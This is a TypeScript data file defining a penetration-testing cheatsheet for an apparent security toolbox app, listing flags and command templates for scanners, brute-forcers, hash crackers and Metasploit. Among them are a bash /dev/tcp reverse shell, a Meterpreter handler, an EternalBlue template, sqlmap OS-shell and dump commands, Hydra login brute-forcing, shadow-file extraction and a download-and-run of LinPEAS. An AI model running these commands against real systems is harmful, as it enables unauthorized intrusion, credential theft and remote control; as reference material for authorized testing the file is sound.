import { externalCheatsheetFlag, localCheatsheetFlag } from '@/domains/toolbox/lib/capabilities';

export const CHEATSHEET = [
  {
    tool: 'Nmap',
    categories: [
      {
        name: 'Stealth / Speed',
        flags: [
          localCheatsheetFlag('-T2', 'Slow & Polite (Avoids IDS)', 'nmap'),
          localCheatsheetFlag('-sS', 'TCP SYN Scan (Half-open)', 'nmap'),
          localCheatsheetFlag('-Pn', 'No Ping (Skip host discovery)', 'nmap'),
        ],
      },
      {
        name: 'Standard',
        flags: [
          localCheatsheetFlag('-sV', 'Version Detection', 'nmap'),
          localCheatsheetFlag('-sC', 'Default Scripts', 'nmap'),
          localCheatsheetFlag('-O', 'OS Detection', 'nmap'),
        ],
      },
      {
        name: 'Aggressive',
        flags: [
          localCheatsheetFlag('-A', 'Aggressive (OS, Scripts, Traceroute)', 'nmap'),
          localCheatsheetFlag('-T4', 'Aggressive Timing', 'nmap'),
          localCheatsheetFlag('-p-', 'Scan All 65,535 Ports', 'nmap'),
        ],
      },
    ],
  },
  {
    tool: 'Gobuster / FFUF',
    categories: [
      {
        name: 'Directory Brute',
        flags: [
          localCheatsheetFlag('-x php,txt,html', 'Add extensions (Gobuster)', 'gobuster'),
          localCheatsheetFlag('-t 50', 'Increase threads (Faster)', 'gobuster'),
          localCheatsheetFlag('-recursion', 'Recursive scanning', 'gobuster'),
        ],
      },
      {
        name: 'FFUF Special',
        flags: [
          localCheatsheetFlag('-mc 200,403', 'Filter Match Codes', 'ffuf'),
          localCheatsheetFlag('-fc 404', 'Filter Out 404s', 'ffuf'),
          localCheatsheetFlag('-H "Header: Value"', 'Add Custom Header', 'ffuf'),
        ],
      },
    ],
  },
  {
    tool: 'SMB / AD',
    categories: [
      {
        name: 'SMBClient',
        flags: [
          localCheatsheetFlag('-N', 'No Password (Anonymous)', 'smbclient'),
          localCheatsheetFlag('-L', 'List Shares', 'smbclient'),
        ],
      },
      {
        name: 'Enum4Linux',
        flags: [
          localCheatsheetFlag('-a', 'Do everything', 'enum4linux'),
          localCheatsheetFlag('-U', 'Get userlist', 'enum4linux'),
        ],
      },
    ],
  },
  {
    tool: 'Curl (Data Extraction)',
    categories: [
      {
        name: 'Headers & Cookies',
        flags: [
          localCheatsheetFlag('-I', 'Fetch Headers only', 'curl'),
          localCheatsheetFlag('-b "c=1"', 'Send Cookie', 'curl'),
          localCheatsheetFlag('-H "Header: Val"', 'Custom Header', 'curl'),
        ],
      },
      {
        name: 'Extraction & Burp',
        flags: [
          localCheatsheetFlag('-L', 'Follow Redirects', 'curl'),
          localCheatsheetFlag('-o out.txt', 'Save Output to file', 'curl'),
          localCheatsheetFlag('-x http://127.0.0.1:8080', 'Proxy to Burp', 'curl'),
        ],
      },
    ],
  },
  {
    tool: 'External Advisors',
    categories: [
      {
        name: 'Traffic Analysis',
        flags: [
          externalCheatsheetFlag('Burp Suite', 'Best for intercepting & modifying requests', 'Reference workflow; not executed by the local runtime.'),
          externalCheatsheetFlag('Postman', 'Great for API testing and automation', 'Reference workflow; not executed by the local runtime.'),
        ],
      },
    ],
  },
  {
    tool: 'DNS & SSL Recon',
    categories: [
      {
        name: 'DNS Enumeration',
        flags: [
          localCheatsheetFlag('dnsrecon -d {t} -t std', 'Standard DNS scan', 'dnsrecon'),
          localCheatsheetFlag('dnsrecon -d {t} -t brt', 'DNS Brute force', 'dnsrecon'),
          localCheatsheetFlag('dnsrecon -d {t} -a', 'AXFR Zone Transfer', 'dnsrecon'),
        ],
      },
      {
        name: 'SSL/TLS Analysis',
        flags: [
          localCheatsheetFlag('sslscan {t}', 'Full SSL/TLS scan', 'sslscan'),
          localCheatsheetFlag('sslscan --certinfo {t}', 'Show certificate info', 'sslscan'),
        ],
      },
    ],
  },
  {
    tool: 'Advanced Web',
    categories: [
      {
        name: 'SQL Exploration',
        flags: [
          localCheatsheetFlag('sqlmap -u "url" --batch', 'Automatic SQLi scan', 'sqlmap'),
          localCheatsheetFlag('sqlmap -u "url" --dbs', 'List databases', 'sqlmap'),
          localCheatsheetFlag('sqlmap -u "url" -D db --tables', 'List tables in DB', 'sqlmap'),
          localCheatsheetFlag('sqlmap -u "url" -D db -T tbl --dump', 'Dump table data', 'sqlmap'),
          localCheatsheetFlag('sqlmap -u "url" --level=5 --risk=3', 'Aggressive scanning', 'sqlmap'),
          localCheatsheetFlag('sqlmap -u "url" --os-shell', 'Attempt OS shell', 'sqlmap'),
        ],
      },
    ],
  },
  {
    tool: 'SearchSploit / Exploit-DB',
    link: 'https://www.exploit-db.com',
    categories: [
      {
        name: 'Exploit Research',
        flags: [
          localCheatsheetFlag('searchsploit apache 2.4', 'Search local Exploit-DB mirror for Apache 2.4 exploits', 'searchsploit'),
          localCheatsheetFlag('searchsploit smb', 'Search SMB-related public exploits', 'searchsploit'),
          localCheatsheetFlag('searchsploit CVE-2024-0000', 'Search by CVE identifier', 'searchsploit'),
          localCheatsheetFlag('searchsploit -m 00000', 'Mirror a selected exploit locally', 'searchsploit'),
        ],
      },
    ],
  },
  {
    tool: 'Metasploit',
    link: 'https://docs.metasploit.com',
    categories: [
      {
        name: 'Templates',
        flags: [
          localCheatsheetFlag('msfconsole -q -x "search type:exploit name:smb; exit"', 'Search modules quickly', 'msfconsole', 'Metasploit is not bundled in the default runtime image.'),
          localCheatsheetFlag('msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"', 'Meterpreter handler template', 'msfconsole', 'Metasploit is not bundled in the default runtime image.'),
          localCheatsheetFlag('msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"', 'Windows SMB exploit template', 'msfconsole', 'Metasploit is not bundled in the default runtime image.'),
        ],
      },
    ],
  },
  {
    tool: 'Hydra',
    categories: [
      {
        name: 'Brute Force',
        flags: [
          localCheatsheetFlag('-l <user>', 'Single username', 'hydra'),
          localCheatsheetFlag('-L <file>', 'Username list', 'hydra'),
          localCheatsheetFlag('-p <pass>', 'Single password', 'hydra'),
          localCheatsheetFlag('-P <file>', 'Password list', 'hydra'),
          localCheatsheetFlag('-t 4', 'Number of threads (default 16)', 'hydra'),
          localCheatsheetFlag('-s <port>', 'Custom port', 'hydra'),
          localCheatsheetFlag('-V', 'Verbose: show each attempt', 'hydra'),
        ],
      },
      {
        name: 'Protocols',
        flags: [
          localCheatsheetFlag('hydra -l admin -P rockyou.txt ssh://TARGET', 'SSH brute force', 'hydra'),
          localCheatsheetFlag('hydra -l admin -P rockyou.txt ftp://TARGET', 'FTP brute force', 'hydra'),
          localCheatsheetFlag('hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', 'HTTP form brute force', 'hydra'),
        ],
      },
    ],
  },
  {
    tool: 'John the Ripper',
    categories: [
      {
        name: 'Cracking',
        flags: [
          localCheatsheetFlag('--wordlist=<file>', 'Dictionary attack', 'john'),
          localCheatsheetFlag('--format=<fmt>', 'Force hash format (md5, sha1, ntlm...)', 'john'),
          localCheatsheetFlag('--rules', 'Apply word mangling rules', 'john'),
          localCheatsheetFlag('--show', 'Show cracked passwords', 'john'),
          localCheatsheetFlag('--incremental', 'Brute force mode', 'john'),
        ],
      },
      {
        name: 'Hash Extraction',
        flags: [
          localCheatsheetFlag('ssh2john id_rsa > hash.txt', 'Extract hash from SSH key', 'john'),
          localCheatsheetFlag('zip2john file.zip > hash.txt', 'Extract hash from ZIP', 'john'),
          localCheatsheetFlag('unshadow /etc/passwd /etc/shadow > combined.txt', 'Combine passwd + shadow', 'john'),
        ],
      },
    ],
  },
  {
    tool: 'Hashcat',
    categories: [
      {
        name: 'Attack Modes',
        flags: [
          localCheatsheetFlag('-a 0', 'Dictionary attack', 'hashcat'),
          localCheatsheetFlag('-a 3', 'Brute-force / mask attack', 'hashcat'),
          localCheatsheetFlag('-a 6', 'Hybrid wordlist + mask', 'hashcat'),
        ],
      },
      {
        name: 'Common Hash Types (-m)',
        flags: [
          localCheatsheetFlag('-m 0', 'MD5', 'hashcat'),
          localCheatsheetFlag('-m 100', 'SHA1', 'hashcat'),
          localCheatsheetFlag('-m 1000', 'NTLM (Windows)', 'hashcat'),
          localCheatsheetFlag('-m 1800', 'sha512crypt ($6$) - Linux shadow', 'hashcat'),
          localCheatsheetFlag('-m 3200', 'bcrypt ($2*$)', 'hashcat'),
          localCheatsheetFlag('-m 13100', 'Kerberos TGS-REP (AS-REP roasting)', 'hashcat'),
        ],
      },
      {
        name: 'Usage',
        flags: [
          localCheatsheetFlag('--show', 'Display already-cracked hashes', 'hashcat'),
          localCheatsheetFlag('-o out.txt', 'Save cracked passwords to file', 'hashcat'),
          localCheatsheetFlag('hashcat -m 0 hash.txt rockyou.txt', 'MD5 dictionary crack', 'hashcat'),
        ],
      },
    ],
  },
  {
    tool: 'Nikto',
    categories: [
      {
        name: 'Scanning',
        flags: [
          localCheatsheetFlag('-h <target>', 'Target host or URL', 'nikto'),
          localCheatsheetFlag('-p <port>', 'Target port (default 80)', 'nikto'),
          localCheatsheetFlag('-ssl', 'Force SSL/HTTPS', 'nikto'),
          localCheatsheetFlag('-o <file>', 'Output file', 'nikto'),
          localCheatsheetFlag('-Format <fmt>', 'Output format: htm, csv, txt, xml', 'nikto'),
          localCheatsheetFlag('-Tuning x', 'Scan tuning: 1=Files, 2=Misc, 4=Inject, 9=SQL...', 'nikto'),
          localCheatsheetFlag('-useragent <ua>', 'Set custom User-Agent', 'nikto'),
        ],
      },
    ],
  },
  {
    tool: 'Feroxbuster',
    categories: [
      {
        name: 'Directory Brute',
        flags: [
          localCheatsheetFlag('-u <url>', 'Target URL', 'feroxbuster'),
          localCheatsheetFlag('-w <wordlist>', 'Wordlist path', 'feroxbuster'),
          localCheatsheetFlag('-x php,html,txt', 'File extensions to fuzz', 'feroxbuster'),
          localCheatsheetFlag('--depth 2', 'Recursion depth (0 = unlimited)', 'feroxbuster'),
          localCheatsheetFlag('--filter-status 404,403', 'Hide responses by status code', 'feroxbuster'),
          localCheatsheetFlag('--no-recursion', 'Disable recursive scanning', 'feroxbuster'),
          localCheatsheetFlag('-t 50', 'Number of threads', 'feroxbuster'),
          localCheatsheetFlag('-o out.txt', 'Save output to file', 'feroxbuster'),
        ],
      },
    ],
  },
  {
    tool: 'Privilege Escalation',
    categories: [
      {
        name: 'Windows / AD',
        flags: [
          externalCheatsheetFlag('whoami /priv', 'Check Windows privileges', 'Run this on the target shell, not the local runtime.'),
          externalCheatsheetFlag('net user /domain', 'List domain users', 'Run this on the target shell, not the local runtime.'),
          externalCheatsheetFlag('nltest /dclist:{domain}', 'Enumerate domain controllers', 'Run this on the target shell, not the local runtime.'),
          externalCheatsheetFlag('bloodhound-python -d {domain} -u {user} -p {password} -gc {target} -c All', 'Collect BloodHound data', 'Use this where BloodHound tooling is installed and properly scoped.'),
        ],
      },
      {
        name: 'Post-Exploitation',
        flags: [
          externalCheatsheetFlag('bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"', 'Bash reverse shell template', 'Run this on the target host or paste into a remote foothold workflow.'),
          externalCheatsheetFlag('powershell -nop -c "<reverse shell here>"', 'PowerShell reverse shell placeholder', 'Run this on the target host or paste into a remote foothold workflow.'),
          externalCheatsheetFlag('curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh', 'Run LinPEAS', 'Usually executed on the target host after foothold.'),
        ],
      },
    ],
  },
  {
    tool: 'GTFOBins / PrivEsc',
    link: 'https://gtfobins.github.io',
    categories: [],
  },
];
